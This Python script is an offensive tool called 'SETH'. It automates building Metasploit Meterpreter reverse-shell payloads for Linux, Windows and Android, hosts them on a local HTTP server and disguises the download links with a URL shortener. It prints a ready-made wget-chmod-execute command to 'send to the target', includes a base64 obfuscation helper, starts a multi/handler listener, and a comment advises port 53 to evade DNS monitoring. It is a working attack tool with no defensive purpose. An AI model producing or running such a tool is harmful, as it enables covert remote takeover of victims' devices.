import os
import subprocess
import time
import base64
import random
import string
import requests

# config
LHOST = "192.168.43.103"
LPORT = "4444"  # i might use 53 for real world scenarios,you can use 53 since people forget to check dns
HTTP_PORT = "8080"
OBFUSCATE = True # force if you don't care about obfuscation
SHORTEN_LINKS = True # also false if you don't want to shorten your link

# generate random filename
def random_name(extension):
    return ''.join(random.choices(string.ascii_lowercase, k=8)) + extension

# obfuscation
def obfuscate_payload(payload):
    encoded = base64.b64encode(payload.encode()).decode()
    return f"echo {encoded} | base64 -d | bash"

# start python http server...i will bind 0.0.0.0 if this fails later
def start_http_server():
    print("[*] Starting HTTP server...")
    os.system(f"nohup python3 -m http.server {HTTP_PORT} --bind 0.0.0.0 > /dev/null 2>&1 &")
    time.sleep(2)

# shorten URL
def shorten_url(url):
    if SHORTEN_LINKS:
        response = requests.get(f"http://tinyurl.com/api-create.php?url={url}")
        return response.text
    return url

# generate payloads(windows,linux,android)
def generate_payload(platform):
    payloads = {
        "linux": "linux/x64/meterpreter/reverse_tcp",
        "windows": "windows/x64/meterpreter/reverse_tcp",
        "android": "android/meterpreter/reverse_tcp"
    }
    
    extensions = {
        "linux": ".elf",
        "windows": ".exe",
        "android": ".apk"
    }
    if platform not in payloads:
        print("[!] Invalid platform.")
        return
    
    filename = random_name(extensions[platform])
    
    print(f"[*] Generating {platform.capitalize()} payload...")
    os.system(f"msfvenom -p {payloads[platform]} LHOST={LHOST} LPORT={LPORT} -f {extensions[platform][1:]} -o {filename}")
    
    # always set payload as executable
    os.system(f"chmod +x {filename}")
        
    print(f"[+] {platform.capitalize()} payload created: {filename}")
    
    short_link = shorten_url(f"http://{LHOST}:{HTTP_PORT}/{filename}")
    
    # ✅ Automatically generate the execution command for the target
    execution_command = f"wget -qO {filename} {short_link} && chmod +x {filename} && ./{filename}"
    print(f"[*] Send this to the target:\n    {execution_command}")

# Start Metasploit listener with correct payload
def start_metasploit():
    print("[*] Select payload type for Metasploit:")
    print("[1] Linux (ELF)")
    print("[2] Windows (EXE)")
    print("[3] Android (APK)")
    
    choice = input("Select payload type: ")
    
    payloads = {
        "1": "linux/x64/meterpreter/reverse_tcp",
        "2": "windows/x64/meterpreter/reverse_tcp",
        "3": "android/meterpreter/reverse_tcp"
    }
    payload = payloads.get(choice, "linux/x64/meterpreter/reverse_tcp")

    print("[*] Starting Metasploit listener...")
    msf_script = f"""
    use exploit/multi/handler
    set payload {payload}
    set LHOST {LHOST}
    set LPORT {LPORT}
    set ExitOnSession false
    exploit -j -z
    """
    
    with open("msf.rc", "w") as f:
        f.write(msf_script)

    os.system("msfconsole -q -r msf.rc")

# main..i will think of a better name seth is gayish
def main():
    start_http_server()
    while True:
        print("""
        ███████╗███████╗████████╗██╗  ██╗
        ██╔════╝██╔════╝╚══██╔══╝██║  ██║
        ███████╗█████╗     ██║   ███████║
        ╚════██║██╔══╝     ██║   ██╔══██║
        ███████║███████╗   ██║   ██║  ██║
        ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
        
        🔥 quicker way to generate that rev shell 🔥
        """)
        
        print("[1] Linux Reverse Shell")
        print("[2] Windows Reverse Shell")
        print("[3] Android Reverse Shell")
        print("[4] Start Metasploit & Monitor sessions")
        print("[0] Exit")
        
        choice = input("Select an option: ")
        if choice == "1":
            generate_payload("linux")
        elif choice == "2":
            generate_payload("windows")
        elif choice == "3":
            generate_payload("android")
        elif choice == "4":
            start_metasploit()
        elif choice == "0":
            print("[*] Exiting...")
            break
        else:
            print("[!] Invalid option.")
        
if __name__ == "__main__":
    main()

